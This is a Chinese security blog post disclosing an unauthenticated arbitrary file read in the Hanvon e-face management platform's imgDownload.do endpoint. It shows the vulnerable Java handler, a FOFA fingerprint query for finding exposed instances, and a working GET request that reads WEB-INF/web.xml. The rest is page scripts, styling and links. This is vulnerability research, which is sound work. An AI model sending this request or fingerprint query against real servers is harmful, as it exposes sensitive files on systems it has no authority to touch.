---
title: "汉王e脸通综合管理平台 imgDownload.do 任意文件读取漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-resourceUpload-imgDownload-fileread.html
asset_dir: assets/汉王e脸通综合管理平台-imgdownload.do-任意文件读取漏洞
---

# 汉王e脸通综合管理平台 imgDownload.do 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/5 08:36
* 924浏览
* [0评论](#comment)
* 14分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `imgDownload.do` 接口存在任意文件读取漏洞。攻击者可在无需认证的情况下，通过构造恶意请求访问 `imgDownload.do` 接口，传入任意文件路径参数，实现服务器上任意文件的读取，影响系统敏感数据的泄露和信息安全。

漏洞预警服务

# 影响版本

v1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `ResourceUploadController` 下的 `imgDownload.do` 实现方式

```
@RequestMapping(
        value = {"/imgDownload.do"},
        method = {RequestMethod.GET}
    )
    @ResponseBody
    public void imgDownload(@RequestParam(required = true) String filePath, HttpServletRequest request, HttpServletResponse response) {
        try {
            String fullPath = PhotoStoreUtils.getCaptureDirectoryPhysicalPath() + filePath;
            FileInputStream is = new FileInputStream(fullPath);
            int i = is.available();
            byte[] data = new byte[i];
            is.read(data);
            is.close();
            response.setContentType("image/*");
            OutputStream toClient = response.getOutputStream();
            toClient.write(data);
            toClient.close();
        } catch (IOException var9) {
        }

    }
```

用户可控参数 `filePath` 被直接拼接到路径上进行操作，朴实无华的任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。

# 漏洞复现

```
GET /manage/resourceUpload/imgDownload.do?filePath=/manage/WEB-INF/web.xml&recoToken=SGUsqvF7cVS HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 imgDownload.do 任意文件读取漏洞](images/img-001-1742a3809f47.webp)](https://image.mrxn.net/79d7499567844bc4b26f9211dd8f0a88.webp)

成功读取到 `web.xml` 文件

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 imgDownload.do 任意文件读取漏洞](https://mrxn.net/jswz/hanvon-efacego-resourceUpload-imgDownload-fileread.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-resourceUpload-imgDownload-fileread.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

物流软件安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-resourceUpload-imgDownload-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

安全工具开发

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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